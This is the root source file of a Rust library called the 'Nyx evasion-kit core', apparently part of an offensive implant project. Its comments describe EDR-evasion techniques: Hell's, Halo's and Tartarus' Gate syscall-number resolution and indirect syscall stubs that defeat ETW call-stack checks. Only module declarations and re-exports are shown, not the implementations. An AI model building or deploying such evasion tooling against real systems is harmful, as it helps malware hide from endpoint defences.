//! Nyx evasion-kit *core* — the portable, unit-testable parts of BRC4-grade
//! stealth. The heavy Windows-specific pieces (PEB walk of ntdll, inline-asm
//! `syscall` dispatch, CreateTimerQueueTimer-based sleep obfuscation) live in
//! the PIC implant (`crates/implant-win`); this crate holds the algorithms and
//! byte templates those feed, written so they compile and test on any host.
//!
//! `#![no_std]`-portable so the PIC implant can link it without pulling in std
//! (which would duplicate the panic_impl lang item). Uses `alloc` for Vec.
//! Integration tests (tests/ssn.rs) link std themselves.
//!
//! What's here:
//! - [`syscalls`] — syscall-number (SSN) resolution: Hell's Gate, Halo's Gate,
//!   Tartarus' Gate, over an abstract [`syscalls::SyscallSource`]. EDRs hook
//!   Nt* stubs by overwriting their prologue; these algorithms recover the real
//!   SSN anyway.
//! - [`stub`] — direct vs *indirect* syscall stub templates. Indirect syscalls
//!   `jmp` to a `syscall` instruction *inside ntdll* so the return address ETW
//!   call-stack checks see is a legitimate module address.
//!
//! ## Honest boundaries
//! - ETW Threat-Intelligence is **kernel-mode**; user-mode code can only blind
//!   user-mode ETW providers. Fully killing ETW-TI needs a kernel driver
//!   (future scheme-C, out of v1 scope).
//! - These templates are the *logic*. Resolving live ntdll bytes + emitting the
//!   `syscall` is the implant's job on Windows.
//!
//! ## References
//! - Hell's Gate — am0nsec (original VX technique).
//! - Halo's Gate — Reenz0h (Sektor7): neighbor-walk past hooked stubs.
//! - Tartarus' Gate — Paul Laîné: sort-by-address, tolerates gaps.
//! - Indirect syscalls — SysWhispers2/3, RedOps; return-address legitimacy.
//! - `hypnus` (joaoviictorti) — proves Rust sleep-obf + stack-spoof is viable.

#![no_std]

extern crate alloc;

pub mod stub;
pub mod syscalls;

pub use syscalls::{
    halos_gate, hells_gate, parse_ssn, resolve_table, tartarus_gate, SyscallSource,
};
